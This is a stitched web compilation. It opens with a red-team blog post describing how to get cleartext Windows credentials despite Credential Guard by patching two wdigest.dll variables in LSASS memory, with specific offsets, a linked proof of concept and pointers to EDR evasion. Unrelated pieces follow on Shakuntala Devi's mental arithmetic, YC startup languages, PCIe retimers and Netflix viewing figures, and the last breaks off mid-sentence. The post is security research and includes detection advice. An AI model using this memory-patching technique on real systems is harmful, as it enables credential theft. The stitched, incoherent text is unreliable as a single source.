<p>After reading XPN’s post, myself and a co-worker started exploring other possibilities for bypassing / disabling protections using memory patching. &nbsp;Windows Defender Credential Guard seemed like an excellent target for this type of attack.</p>



<p><em>TL/DR &amp;&amp; (POC || GTFO)</em><br><em>Wdigest can be enabled on a system with Credential Guard by patching the values of g_fParameter_useLogonCredential and g_IsCredGuardEnabled in memory. <a href="https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240" target="_blank" rel="noreferrer noopener">PoC located here</a>.</em></p>



<blockquote><p>“Introduced in Windows&nbsp;10 Enterprise and Windows Server 2016, Windows Defender Credential Guard uses virtualization-based security to isolate secrets so that only privileged system software can access them. Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. Windows Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored by applications as domain credentials.” </p><cite><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard" rel="nofollow">https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard</a></cite></blockquote>



<p>Currently, the most common way to overcome Cred Guard is to register a new Security Support Provider (SSP) (<a href="https://twitter.com/gentilkiwi/status/1044715664823308289">Mimikatz memssp</a> or a custom one).&nbsp; This is generally loaded into memory and then captures and writes any credentials entered.&nbsp; This can <a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">be modified </a> (seriously, @_xpn_ is a beast) to improve opsec but we wanted to see if there was a simpler and hopefully less identifiable way to do this.</p>



<p>The first thing we should check is if we can just enable UseLogonCredential on a system with Credential Guard enabled.&nbsp; <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-protection-limits">Per MSDN</a>:</p>



<blockquote><p>“When Windows Defender Credential Guard is enabled, neither Digest nor CredSSP have access to users’ logon credentials. This implies no Single Sign-On use for these protocols.”</p></blockquote>



<p>This <em>suggests </em>that enabling UseLogonCredential on a system with Credential Guard will not have any impact on an attacker’s ability to get credentials from memory since Digest will not have access even if enabled.&nbsp; It still seems worth testing, just in case.</p>



<p>First, we identify the offset of g_fParameter_useLogonCredential.&nbsp; It should be noted that this will change between versions of wdigest.dll (but is static between systems with the same version).&nbsp; This can easily be done with any debugger.</p>



<figure><img data-attachment-id="50" data-permalink="https://teamhydra.blog/uselogoncred/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png" data-orig-size="1016,309" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="uselogoncred" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=1016" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png 1016w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=768 768w" sizes="(max-width: 1016px) 100vw, 1016px"></figure>



<p>We can see wdigest!g_fParameter_useLogonCredential is 0x36124 bytes from the base of wdigest.dll (we are testing on Windows 10 Enterprise version 1909).&nbsp; With this information we can easily find and patch wdigest in memory on the host.</p>



<p>Let’s boot up our system and ensure that Credential Guard is enabled.</p>



<div><figure><img data-attachment-id="53" data-permalink="https://teamhydra.blog/cropped_credguardonsystem/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png" data-orig-size="1128,555" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_credguardonsystem" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024 1024w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=768 768w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png 1128w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>Now, run our PoC that patches UseLogonCredential.</p>



<div><figure><img data-attachment-id="54" data-permalink="https://teamhydra.blog/cropped_patchlogoncredentials/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png" data-orig-size="568,181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_patchlogoncredentials" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png 568w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300 300w" sizes="(max-width: 568px) 100vw, 568px"></figure></div>



<p>Finally, log in with a new user and see if we got credentials…..</p>



<div><figure><img data-attachment-id="55" data-permalink="https://teamhydra.blog/failed_mimi/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png" data-orig-size="442,132" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="failed_mimi" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" src="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png 442w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300 300w" sizes="(max-width: 442px) 100vw, 442px"></figure></div>



<p>Unsurprisingly, we are still unable to get new credentials.&nbsp; However, it seems like there may be more here to investigate, so we return to looking at wdigest.dll and see what other variables exist that could be of interest to us.</p>



<div><figure><img data-attachment-id="57" data-permalink="https://teamhydra.blog/globalvars/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png" data-orig-size="696,647" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="globalvars" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" src="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png 696w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300 300w" sizes="(max-width: 696px) 100vw, 696px"></figure></div>



<p>g_IsCredGuardEnabled is set to 1 when Cred Guard is enabled on a system.&nbsp; Unsetting this value seems to be worth trying.</p>



<p>&nbsp;Using the same technique as we used previously to get the offset to UseLogonCredential, we find the offset for g_IsCredGuardEnabled (here it is 0x35b88) and patch. &nbsp;Sadly, setting this value to 0 seemed to have no impact on anything relevant to our purposes.&nbsp; It turns out that the SpAcceptCredentials function in wdigest.dll checks both UseLogonCredential and IsCredGuardEnabled values to determine how to handle caching credentials. (We noticed later that XPN pointed out this value in his blog, but never goes farther into it).</p>



<p>So, what happens when we patch wdigest to enable UseLogonCredentials and unset IsCredGuardEnabled?&nbsp;</p>

<p>Clear text credentials!&nbsp; Note, this is NOT disabling Credential Guard but instead circumventing it by enabling wdigest.</p>



<p>As Credential Guard exists explicitly to help prevent elevated attackers from obtaining credentials from LSASS I reported this to Microsoft on principle.</p>



<p>Their response:</p>



<p>“After investigating this issue, we do not believe this is a Credential Guard bypass. Credential Guard is meant to protect credentials that were cached while the feature is enabled. If a privileged user disables Credential Guard, then the feature cannot protect subsequent logons. We’ll update our public documentation to clarify this behavior”</p>



<p>Given this response, I suspect this will be a reliable method of gaining clear text credentials on systems with Credential Guard enabled for the foreseeable future.</p>



<p>Memory patching host-based defenses has become a major aspect of modern red teaming.&nbsp; It is used to bypass AMSI, disable ETW, blind EDRs, and get cleartext credentials.&nbsp; This is just one more minor addition to the application of this type of technique. &nbsp;Hopefully posts like this will lead to increased visibility and better mitigation for this type of post-compromise action.</p>



<p>OPERATIONAL CONSIDERATIONS</p>



<p>The PoC provided IS NOT OPSEC SAFE.&nbsp; It is meant to demonstrate the concept.&nbsp; One of the biggest issues with this technique is that you are interacting directly with LSASS which is often looked for by EDRs (especially WriteProcessMemory).&nbsp; There have been many great posts about overcoming some of these hurdles (<a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6">unhooking</a> and using <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">direct syscalls</a>) but I leave it to you to pursue implementing this technique operationally.</p>



<p>DETECTION AND PREVENTION</p>



<p>Not much to say here that hasn’t been said before.&nbsp; Monitoring LSASS, limiting administrators, network segmentation, all the usual suspects apply.&nbsp; A motivated and knowledgeable adversary that gains SYSTEM on a machine in your network will probably be able to accomplish what they need to on THAT system.&nbsp; The goal is to increase the cost in time, effort, and tooling to achieve that goal thus making your network less appealing as a target and increasing opportunities for detection and response. </p>

<p><em>This was originally posted as an answer on Quora to the question “<a href="https://www.quora.com/How-did-Shakuntala-Devi-mentally-calculate-the-23rd-root-of-a-201-digit-number-correctly/answer/Peter-S-Magnusson" target="_blank">How did Shakuntala Devi mentally calculate the 23rd root of a 201-digit number correctly?</a>“.&nbsp;</em></p>
<p><span>Devi was a very talented mental calculator, but by no means the extreme prodigy that she has been made out to be in the media, and she certainly couldn’t take the 23rd root of a number “faster than a computer”.</span></p>
<p>She was an accomplished showman – she grew up traveling with her father and giving performances, and when her father got too old, she travelled by herself and sent money to her family. The modern field of mental calculators generally shies away from words like “prodigy” or “genius”. Mental calculation is obviously related to mathematics, but many of the historically great mental calculators were not particularly knowledgeable in mathematics per se.</p>
<p>By calling her an “accomplished showman”, I don’t mean to denigrate her at all, quite to the contrary. It’s an intricate, and old, art form, dating at least to the 1700s, more akin to the work of an illusionist than that of a professor in mathematics. It takes hard work and dedication to be a good illusionist of any sort. Devi was born, and performed, in a simpler era, one before the internet and computers that have deconstructed much of the “magic” of these artists. And her story in particular – as a poor child traveling in India, earning a living for her family with her demonstrations – holds a deep appeal to us. Especially since, by all accounts I’ve read of those who met her, she was a very special person.</p>
<p>(If you want a demonstration of the “powerful magic” of mental calculation, just search the internet for the tricks involved in solving 3rd roots and 5th roots of large integers in your head. You will astonish your friends and family by just a little effort of rote memorization.)</p>
<p>There are a few things you first have to know about mental calculations of this sort. They are mostly related to memorization and pattern matching, and putting various significant constraints on the problems being asked. If you are not versed in the arts, some tricks that appear very difficult are in fact quite simple. That, after all, is the general art of illusion.</p>
<p>Today, this art form is called “mathemagic”, and notable “mathemagicians” include Martin Gardner, Arthur T Benjamin, Raymond Smullyan, and Persi Diaconis.</p>
<p>Let me take an example from Devi’s life, before I jump into the actual question. Famously, Devi travelled to the US in 1988, including a visit to San Francisco. A Psychology Professor at Berkeley attended one such event, and he published an article about it in 1990 (“Speed of Information Processing in a Calculating Prodigy”, Arthur R. Jensen, INTELLIGENCE 14, 259-274).&nbsp;Jensen describes how he gave two questions to Devi on note cards that he had prepared:<br>
</p>
<blockquote><p>“When I handed Devi two problems, each on a separate card, thinking she would solve first one, then the other, my wife was taken by surprise, as there was hardly time to start the stopwatch, so quick was Devi’s response. Holding the two cards side-by-side, Devi looked at them briefly and said, “The answer to the first is 395 and to the second is 15. Right?” Right, of course! (Her answers were never wrong.) Handing the cards back to me, she requested that I read the problems aloud to the audience. They were: (a) the cube root of 61,629,875 (= 395), and (b) the 7th root of 170,859,375 (= 15). I was rather disappointed that these problems seemed obviously too easy for Devi, as I had hoped they would elicit some sign of mental strain on her part. After all, it had taken me much longer to work them with a calculator”</p></blockquote>
<p><span>Let’s look closely at&nbsp;the first problem, finding the cube root of 61,629,875. The third root of an 8-digit number will have exactly three digits (because it will be between 215 and 464). The third digit is trivial, because a number cubed, modulo 10, only depends on the last digit. In fact, most of the digits are identical – if the last digit of a cube is 1, 4, 5, 6, 9, or 0, then it’s the same in the root; 2 and 8 swap places as do 3 and 7. So we know the last digit is “5”. The first digit is trivial too, in an 8-digit cube it can only be 2, 3, or 4. In this case 61 is close to 64, which is 4 cubed. In fact, it’s very close, so we know the answer will be just below 400, because 400 cubed is 64,000,000. Now, what 3-digit number is just below 400 and ends in 5?</span></p>
<p>That’s why it only took Devi a few seconds to answer. Jensen, a psychologist, doesn’t know the art. Just as it takes a magician to explain what another magician does, it takes an accomplished mental calculator to explain the field to you. What seems amazing (cube root of 61,629,875 in two seconds!) might be straight forward if you know the “trade”.</p>
<p>Though Jensen was not an appropriate judge of these mental feats, he did subject her to a full range of psychological testing, and those are the parts that are valuable reading in his article. Notably, she didn’t score exceptional in any cognitive area, except memory for numbers.</p>
<p>In Devi’s case, we don’t know what techniques&nbsp; she used for this demonstration. Why? Because she never told people. And why would she. She had made a living since kindergarten as a performer. Professional performers don’t reveal their magic. If they do, it’s not magical any more.</p>
<p>But lots of other mental calculators have shared details, many at least on par with Devi’s abilities and several distinctly stronger – people like Wim Klein, Hans Eberstark, Gert Mittring, and Alexis Lemaire, the latter likely the greatest living mental calculator.</p>
<p>Now, let’s get a bit closer to the actual question.</p>
<p>The original story is that in 1977, at the Southern Methodist University in Dallas, Devi extracted the 23rd root of a 201-digit number. As reported at the time (Dallas Morning News, January 26th and later a bit more sensationalized in an editorial on February 6th), the problem was presented to her from a calculation on a Univac 1101 at the Bureau of Standards, and it took the computer over a minute to calculate it, but it took Devi just 50 seconds. Therefore, she had “beaten the computer”, which became the theme of the media coverage and greatly contributed to her fame.</p>
<p>The problem, as posed, was to take the 23rd root of this number:</p>
<p>916, 748, 676, 920, 039, 158, 098, 660, 927, 585, 380, 162, 483, 106, 680, 144, 308, 622, 407, 126, 516, 427, 934, 657, 040, 867, 096, 593, 279, 205, 767, 480, 806, 790, 022, 783, 016, 354, 924, 852, 380, 335, 745, 316, 935, 111, 903, 596, 577, 547, 340, 075, 681, 688, 305, 620, 821, 016, 129, 132, 845, 564, 805, 780, 158, 806, 771</p>
<p>The answer (in case it’s not immediately obvious to you) is 546,372,891.</p>
<p>The first thing to note was that the Univac 1101 and Devi were solving two completely different problems. Raising a nine-digit number to the 23rd power –&nbsp; e.g. multiplying a number by itself 23 times – is a much harder problem than taking the 23rd root – if you know that the result will be an integer.</p>
<p><i>(Parenthetically, the “1101” is probably a typo or some other error. That model is a 1951 vacuum-tube computer that could do about three multiplications per second. Other reports said Univac 1106, or 1108, but that was from 1969 and also a bit old at the time. The “Bureau of Standards” was responsible for running US census data, and thus the principal government progenitor of much of the computer industry. Given the year of 1977, my guess would be that it was actually a Univac 1110, which launched in 1972. Though why anybody would chose a Univac in 1977 is another mystery, since by then IBM had long taken over the industry. But “Univac” was famous and known by readers, after having predicted the Presidential election in 1952 live on television. So it was probably equivalent in people’s minds to “big computer”.)</i></p>
<p>In general, the difficulty lies not in the size of the number (201 digits) or the power (23). It’s the number of digits in the answer. Now, the 23rd root of a 201-digit number will have nine digits. Remember the example above, of a 3rd root that resulted in a 3-digit answer? The beginning and the end are trivial, the middle requires some thought.</p>
<p>The same principle continues to apply to larger powers – except that the notion of “trivial” becomes “quite difficult”, and the notion of “some thought” becomes “that’s really hard”.</p>
<p>In this case, nine digits, the middle two are the hard ones – the first three and the last four are “easy”.</p>
<p>The last four (2891) of the answer is completely determined by the last four (6771) of the cube.</p>
<p>If you want to test that, try raising the number xxx,xx2,891 to the power of 23 – and insert any numbers you want for the “x”:s. In fact, you can take any integer that ends with “2891” and take it to the 23rd power, and the result will end in 6771.</p>
<p>To know what four digits translate to what four digits, there are a bunch of tables you need to memorize, but that’s not as hard as it sounds. For example, the choice of “23” is not a random. Powers of integers where the power is of the form (4n+3) have (simple) patterns for the trailing digits. In particular the last digit is unchanged so you don’t have to remember it at all. Choosing appropriate power (23 in this case) translates to simpler tables to memorize for this step.</p>
<p>Now, look carefully at the first six digits – “916748”. The number “48” is right next to “50”, which means this six-digit number is halfway between “916700” and “916800”. We’ll soon see how this helps.</p>
<p>Let’s start by taking the first four (9167) and factoring it – that’s 89 * 103. Next we apply log tables – at least that’s one of the standard techniques. For this step, I’ll assume Devi has memorized the first 150 or so logs to five decimal digits.</p>
<p>Log (base 10) of each factor is 1.94939 and 2.01284, respectively. Adding the mantissas yield 0.96223. Remember that log(xy) = log(x) + log(y).</p>
<p>Now let’s …</p></div></div>

<p>Note: Ginkgo Bioworks, Boom Supersonic, Grin, Memebox, Helion Energy, North, RelativitySpace, and The Athletic were excluded from the below list; I didn't feel they were primarily software businesses. Feel free to disagree with my judgement.</p>
<p>Note: values current as of August 15, 2020.</p>
<p>Note: if one language was the primary language used to build the initial product, one language is listed above. If it was not clear which language was primary, multiple languages are listed above.</p>
<p>Note: if I couldn't find which language was used to build the startup initially, I referenced the oldest job posting I could find.</p>
<p>Note: valuations are approximate and predominantly sourced from recent articles online. Where I couldn't find an indication of value, ~$150M is assumed; startups listed above were all worth +$150M as of October 2019, as per the <a href="https://www.ycombinator.com/topcompanies/">YC Top Companies</a> page.</p>
<p>Note: "Y" and "N" values in the "DataSci / LowLv" column describe a startup's primary product (i.e. ML startups would have a "Y" for DataSci). It was included to provide additional colour on why initial back-end language(s) may have been used / selected. The values in this column are based entirely on my own judgement. Feel free to disagree with them or ignore them.</p>
<p>Note: Ruby and ruby on rails was a popular choice for YC startups around 2010 - 2012. Anecdotally, ~40% of YC startups used ruby during its peak popularity.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Retimers and redrivers have enabled longer physical channels in servers and storage systems since Peripheral Component Interface Express (PCIe) 3.0 was first introduced almost 10 years ago. Now that PCIe 4.0 is ramping up and PCIe 5.0 is just around the corner, how do these reach extension tools stack up in the face of new challenges in high-speed connectivity?</p>
<p>A redriver is a mostly analog reach extension device designed to boost the high-frequency portions of a signal to counteract the frequency-dependent attenuation caused by the interconnect: the central processing unit (CPU) package, system board, connectors and so on. A redriver’s data path typically includes a continuous time linear equalizer (CTLE), a wideband gain stage and a linear driver. In addition, redrivers often have input loss-of-signal threshold and output receiver (Rx) detection capability. Figure 1 illustrates a typical redriver block diagram.</p>

<p>A retimer is a mixed signal analog/digital device that is protocol-aware and has the ability to fully recover the data, extract the embedded clock and retransmit a fresh copy of the data using a clean clock. In addition to the CTLE and wideband gain stages also found in a redriver, retimers contain a clock and data recovery (CDR) circuit, a decision feedback equalizer (DFE) and a transmit (Tx) finite impulse response (FIR) driver. Finite state machines (FSMs) and/or a microcontroller typically manage the automatic adaptation of the CTLE, wideband gain, DFE and FIR driver, and implement the PCIe link training and status state machine (LTSSM). Figure 2 illustrates a typical retimer block diagram.</p>

<p>In simple terms, a redriver amplifies a signal, whereas a retimer retransmits a fresh copy of the signal. Figure 3 illustrates this and shows how an attenuated eye opening is boosted by a redriver and completely regenerated by a retimer.</p>

<p>Figure 3: Example of an eye attenuated by a channel (left), the eye after a redriver (middle) and the eye after a retimer (right)</p>
<p>The PCIe 4.0 specification took the unprecedented step of formally defining the terms “retimer,” “redriver” and the superset term “repeater,” all of which are types of extension devices or components whose purpose is to extend the physical length of a link. The definitions are:</p>
<ul>
<li><strong>Repeater</strong>: An imprecise term for an extension device [2]. (This term causes confusion … please don’t use it!)</li>
<li><strong>Redriver</strong>: A non-protocol-aware software-transparent extension device [2].</li>
<li><strong>Retimer</strong>: A physical layer protocol-aware, software-transparent extension device that forms two separate electrical link segments [2].</li>
</ul>
<h3>Use Cases for Retimers and Redrivers</h3>
<p>Reach extension devices are necessary whenever the channel – the electrical path between the root complex (RC) and endpoint (EP) – is longer than the PCIe specification allows. The specification defines the maximum channel length in terms of insertion loss at the Nyquist frequency (an informative specification, but easy to validate) and in terms of a reference receiver’s ability to sufficiently equalize and recover the data assuming a worst-case link partner transmitter (a normative specification, but time-consuming to validate).</p>
<p>Suffice it to say, at PCIe 4.0 speeds, reach extension devices are necessary for:</p>
<ul>
<li>Multiconnector topologies.</li>
<li>Cabled topologies.</li>
<li>Single-connector add-in card (AIC) topologies with baseboard channels longer than 9.5 inches.</li>
</ul>
<p>Figure 4 shows an example of a two-connector “riser card” topology, which ordinarily would exceed the PCIe 4.0 loss budget of 28 dB. A redriver or retimer will enable reliable, error-free communication between the RC and EP. But how do you choose which one is the right tool for the job? Well, it helps to know more about the fundamental differences in their capabilities.</p>

<h3>Comparing Retimer and Redriver Capabilities</h3>
<p>Not all redrivers and retimers are the same. There are many distinctions between the two, which are universally true for all PCIe reach extension devices. For example:</p>
<p><strong>Retimers actively participate in the PCIe protocol; redrivers do not.</strong> The PCIe base specification spells out how and to what extent retimers participate in the protocol during Detect, Recovery, L0 and other LTSSM states. Equalization to the L0 and L1 link states requires value-added functionality from the retimer (handshakes, timeouts, bit manipulation, etc.). Redrivers are unaware of and unparticipating in the protocol. If the link works reliably the first time, that’s great! But if the link experiences marginality of any sort, it becomes exceedingly difficult to pinpoint whether the problem is physically before the redriver or after it, since the redriver’s role in link formation is undefined and unknown to its link partners.</p>
<p><strong>Retimers reset the jitter and insertion loss budgets; redrivers do not.</strong> A retimer’s CDR fully recovers the data stream and retransmits it on a clean clock. Starting with a fresh copy of the data enables the extension of the channel to twice the original specification. Without a CDR, the best a redriver can do is attenuate (not reset) the data-dependent jitter (DDJ) caused by intersymbol interference (ISI). A redriver cannot attenuate uncorrelated or random jitter (RJ). In fact, a redriver will always add to RJ due to its own device thermal noise in a root-mean-square (RMS) manner <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
<p><strong>Retimers have a DFE; redrivers do not.</strong> A DFE compensates for reflections in the channel response caused by impedance discontinuities in board vias, connectors and package socket-board interfaces. The nice thing about a DFE is that it is unaffected by crosstalk. The DFE equalizes just as well in the presence of crosstalk, and once the data is sampled by the retimer’s CDR, crosstalk is eliminated for good. Redrivers use a CTLE that boosts both the signal and the noise <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. Crosstalk is not eliminated or even attenuated through a redriver; in fact, it gets amplified.</p>
<p><strong>Retimers automatically adapt their receive and transmit equalizers to match the characteristics of the channel and the link partner’s needs; redrivers do not.</strong> A retimer will examine the signal it receives and adjust the CTLE and DFE to minimize its own bit error rate (BER). Likewise, the retimer’s transmitter will adjust its de-emphasis and pre-shoot equalization to minimize the link partner’s BER according to PCIe equalization protocol. A redriver, conversely, operates with a static equalizer setting. The optimal setting (which can be different for every channel in the system) is often painstakingly selected following an exhaustive search in Input/Output Buffer Information Specification (IBIS) algorithmic modeling interface (AMI) simulations and again in lab testing – a process fondly referred to as “tuning.”</p>
<p><strong>Retimers have built-in features to help diagnose link issues (both electrical and protocol); redrivers do not.</strong> Retimers have tools for assessing the electrical performance (internal eye monitors, pattern generators, pattern checkers) and protocol performance (link state history monitors, timeout adjustments). Redrivers cannot offer such diagnostic features because they are neither protocol-aware nor aware of the actual data passing through. Redrivers do not know what state the link is in.</p>
<p><strong>Retimers correct for lane-to-lane skew; redrivers do not.</strong> PCIe has a tight requirement on the physical skew between lanes on a board (1.6 ns for PCIe 4.0), typically caused by mismatches in channel routing length [3]. Retimers are required to compensate and reset any lane-to-lane skew, effectively doubling the specification budget. Redrivers cannot compensate for lane-to-lane skew, and what’s worse is that they may degrade the skew depending on how symmetric the redriver package is across all lanes.</p>
<p><strong>Retimers can be placed anywhere between two PCIe-compliant channels; redrivers cannot.</strong> By definition, retimers extend the total PCIe channel reach by two times the specification. A redriver’s reach extension, however, depends on where it is placed in the channel – how much loss is before the redriver versus how much is after <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. The specific placement of a redriver must be carefully determined by IBIS-AMI simulation and experimentation. Too close to the root complex transmitter, and the redriver’s CTLE will enter nonlinear operation and will have limited benefit. Placed too far from the transmitter, the redriver’s device noise may significantly degrade the signal-to-noise ratio (SNR) of the data signal.</p>
<p>It’s not all bad news for redrivers. They do have lower power consumption and lower input-to-output latency compared to retimers. But if the link does not form in the first place or if the BER is too high, none of that matters!</p>

<h3>Outlook for PCIe 4.0 Systems</h3>
<p>Looking ahead to the upcoming PCIe 4.0 systems, all signs are pointing to an increased need for reach extension devices – and retimers in particular – due to several trends and challenges:</p>
<ul>
<li>CPUs have more PCIe lanes per socket (&gt;100 in some cases [4]) compared to PCIe 3.0. This leads to a greater number of PCIe slots and riser cards, denser routing, and an increased use of multiconnector topologies.</li>
<li>PCIe is shifting from an I/O bus to a multipurpose system interconnect. This means that more servers will be designed to be modular, allowing an array of compute, storage and networking resources to plug in to an increasing number of PCIe slots. This type of open, “plug anything in and it will work” server architecture requires a reach extension solution that is PCIe compliant with plug-and-play interoperability.</li>
<li>The disaggregation of resources such as modular servers, storage trays and accelerator trays is pushing endpoints physically away from CPUs, requiring cables or carrier cards to connect everything together. These longer physical topologies will increasingly need reach …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As you might have already seen on the Twitter-verse and in <a href="https://www.bloomberg.com/news/articles/2020-07-15/netflix-most-popular-original-movies">Bloomberg</a>, Netflix released its top 10 movies and Extraction topped that list. The numbers in the data represent the number of views that a movie has gathered in the first 4 weeks of its release.</p><p><img src="https://ottverse.com/images/netflix-top-10-movies.png" alt="Top 10 list from Netflix"></p><p>Looks great, right? 99M viewers for Extraction - that’s a huge win for Netflix.</p><p><img src="https://ottverse.com/images/the-extraction-randeep-hooda-chris-hemsworth.png" alt="Extraction from Netflix"></p><p>But, wait. Can we trust these numbers right off the bat?</p><h2 id="netflixs-data-and-reporting-methodologies">Netflix’s Data and Reporting Methodologies</h2><p>The problem with Netflix is that they guard their data religiously and have never released their data in its entirety to the public. So, if they tell you that a movie was watched 100M times in Japan, you just have to take their word for it and break out a bottle of champagne if you were the producer or actor in that film.</p><p>When Netflix’s data says that “Extraction” starring “Thor” Chris Hemsworth and Bollywood star Randeep Hooda garnered 99 million views within the first 4 weeks of its release, does it mean that the movie was truly exceptional and beat every other release on Netflix in terms of audience numbers?</p><p>Well, to be honest, I really can’t say because Netflix’s data is opaque, their methodology is unknown, and their definition of a movie’s popularity using only their “starters” metric is odd to say the least.</p><p>Let me explain why.</p><h2 id="how-does-netflix-quantify-their-audience">How does Netflix Quantify Their Audience</h2><p>The first step in decoding the data that Netflix released is understanding the definitions of their 